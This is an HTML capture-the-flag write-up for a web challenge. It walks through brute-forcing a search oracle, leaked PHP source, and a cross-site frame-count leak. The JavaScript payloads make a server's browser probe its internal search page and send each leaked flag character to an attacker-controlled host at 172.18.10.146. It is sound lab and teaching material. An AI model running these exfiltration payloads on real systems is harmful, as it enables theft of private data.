@@ -1,0 +1,184 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>writeup</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="hacker-affiliates---web-500">Hacker Affiliates - Web 500</h1>
+<blockquote>
+<p>They should already know intended solutions mean nothing to us - sine_nomine</p>
+</blockquote>
+<h2 id="challenge-description">Challenge Description</h2>
+<p>So the attackers at this point seem to have some sort of website where they want their affiliates to register, they say they’ll check out their websites if they do… I wonder if the admin can see what sites have already been registered using that search function they have; see if you can figure it out.</p>
+<p><code>http://172.18.10.105:32581</code></p>
+<h2 id="initial-observations">Initial Observations</h2>
+<p>The website has two input text boxes, each with an associated button. The upper box asks for a URL and doesn’t seem to do anything obvious.</p>
+<p><img src="images/screenshot1.png" alt="Screenshot of Website"></p>
+<p>The second field asks for a search term, and sends you to a blank page. Let’s try a few things and see if the result changes. For example let’s try the flag prefix RTXFLAG.</p>
+<p><img src="images/screenshot2.png" alt="Screenshot of searching RTXFLAG"></p>
+<p>Interesting! It looks like the web page will change if we submit part of the flag. We can write up a quick script to try and leak the flag one byte at a time.</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> string <span class="token keyword">import</span> printable
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
+
+flag <span class="token operator">=</span> <span class="token string">"RTXFLAG{"</span>
+
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+  <span class="token keyword">for</span> c <span class="token keyword">in</span> printable<span class="token punctuation">:</span>
+    test <span class="token operator">=</span> <span class="token string">"http://172.18.10.105:32581/search.php?search="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>flag<span class="token operator">+</span>c<span class="token punctuation">)</span>
+    res <span class="token operator">=</span> wget<span class="token punctuation">(</span>test<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
+      flag <span class="token operator">+=</span> c
+      <span class="token keyword">break</span>
+  <span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'}'</span><span class="token punctuation">:</span>
+    <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+</code></pre>
+<p>This will give us <code>RTXFLAG{YOU_NEED_ADMIN}</code>… A fake flag! It also gives us a huge webpage (3.34MB). The webpage is mostly <code>&lt;br/&gt;</code> but there is some php source in a comment.</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"REDACTED"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token comment">// prevent DNS-rebinding - internal port: 1337 but we only check ip not port</span>
+<span class="token comment">// 172.18.10.105 isn't routable from internal network/server so use 10.144.0.68 or 127.0.0.1 when requesting resources</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"172.19.0.2"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"10.244.0.68"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"10.244.0.1"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"172.18.10.105"</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Use a valid host header! - host: "</span><span class="token punctuation">.</span><span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"RTXFLAG{YOU_NEED_ADMIN}"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"&lt;iframe srcdoc=\"&lt;html&gt;&lt;title&gt;"</span><span class="token punctuation">.</span><span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/title&gt;&lt;body&gt;flag: "</span><span class="token punctuation">.</span><span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/body&gt;&lt;/html&gt;\"&gt;&lt;/iframe&gt;"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"RTXFLAG{YOU_NEED_ADMIN}"</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"&lt;br&gt;\n"</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"REDACTED "</span><span class="token punctuation">.</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"REDACTED"</span><span class="token punctuation">,</span><span class="token string">"REDACTED"</span><span class="token punctuation">,</span><span class="token string">"REDACTED"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"REDACTED"</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"search.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"  the internal server IP and port is 127.0.0.1 1337REDACTED"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"&lt;br&gt;\n"</span><span class="token punctuation">,</span><span class="token number">600000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"View the source, this isn't the real flag"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"&lt;br&gt;\n"</span><span class="token punctuation">,</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre>
+<p>Looks like the source for search.php, but with the flag redacted, this will be helpful in figuring out what’s going on. It looks like if the request doesn’t come from <code>127.0.0.1</code> then it replaces the flag with the fake flag. Then it uses strstr to test if the search input is a substring of the flag, and if it is, an iframe is returned. If the search string equals teh fake flag, then it returns the redacted source.</p>
+<p>So our goal is to try and get the server to connect to itself to test the flag, then exfiltrate the information to us.</p>
+<h2 id="gain-control">Gain Control</h2>
+<p>The first thing we need to do is to try and gain some control of the webapp so that we can make it talk to itself. We can probably assume that the server will reach out to whatever website you give it in the upper text field. Let’s try making the server connect to an IP we control and we will see a response.</p>
+<p>Now we know that the webservice will make a request to whatever we put in the <code>Your URL</code> box. From here we can try to get the web service running some of our Javascript.</p>
+<pre class=" language-javascript"><code class="prism  language-javascript"><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
+<span class="token keyword">function</span> <span class="token function">phoneHome</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">let</span> getter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"http://172.18.10.146:8080/index.html?flag="</span><span class="token operator">+</span>flag<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">phoneHome</span><span class="token punctuation">(</span><span class="token string">"TEST"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>body onLoad<span class="token operator">=</span><span class="token string">'main()'</span><span class="token operator">&gt;</span>
+
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
+
+</code></pre>
+<p>When the service loads this Javascript it should make another GET request to our web server with the flag parameter set to “TEST”.</p>
+<h2 id="exploit">Exploit</h2>
+<p>Now we need to get the webservice to call itself. Let’s try the obvious solution where we just include another XMLHttpRequest() to <code>127.0.0.1:1337/search.php?search=R</code> If this works we should get some data returned in the XHR.</p>
+<pre class=" language-javascript"><code class="prism  language-javascript"><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
+
+<span class="token keyword">function</span> <span class="token function">phoneHome</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">let</span> getter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"http://172.18.10.146:8080/index.html?flag="</span><span class="token operator">+</span>flag<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">testFlag</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">let</span> getter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1/search.php?search="</span><span class="token operator">+</span>flag<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>getter<span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token function">phoneHome</span><span class="token punctuation">(</span><span class="token string">"Good"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">else</span>
+    <span class="token function">phoneHome</span><span class="token punctuation">(</span><span class="token string">"Bad"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">nextChar</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>body onLoad<span class="token operator">=</span><span class="token string">'main()'</span><span class="token operator">&gt;</span>
+
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
+
+</code></pre>
+<p>Now we run this code and… It doesn’t make a callback. So what happened here? There’s a feature in modern web called Cross-Origin Resource Sharing that limits what requests a server can make. CORS kicks in when a server gets a request on a different domain or port and effectively shuts down the connection.</p>
+<p>There is a way to get around that and that is to use iframes. We can create an iframe Javascript element with <code>document.createElement('iframe')</code> and dynamically populate the src field based on the flag parts we’ve discovered.</p>
+<pre class=" language-javascript"><code class="prism  language-javascript"><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
+<span class="token keyword">var</span> attr <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> chars <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ$_!@#abcdefghijklmnopqrstuvwxyz0123456789}"</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> flag <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"flag="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">phoneHome</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">let</span> getter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"http://172.18.10.146:8080/index.html?flag="</span><span class="token operator">+</span>flag<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span>withCredentials<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
+  getter<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">function</span> <span class="token function">nextChar</span><span class="token punctuation">(</span>newIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>newIdx <span class="token operator">&gt;=</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    char <span class="token operator">=</span> chars<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>newIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    attr<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:1337/search.php?search="</span> <span class="token operator">+</span> flag <span class="token operator">+</span> char<span class="token punctuation">;</span>
+    attr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>attr<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>frames<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">phoneHome</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> char<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">nextChar</span><span class="token punctuation">(</span>newIdx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">nextChar</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>body onLoad<span class="token operator">=</span><span class="token string">'main()'</span><span class="token operator">&gt;</span>
+
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
+
+</code></pre>
+<p>This payload will leak the next character of the flag we pass in on the flag parameter. By making the service go to <code>http://172.18.10.146:8080/index.html?flag=RTXFLAG{</code> we will see the next part is <code>http://172.18.10.146:8080/index.html?flag=RTXFLAG{X</code></p>
+<p>We can repeat this process until we leak the entire flag of <code>RTXFLAG{XS_L34KS_VIA_FR4M3}</code></p>
+</div>
+</body>
+
+</html>
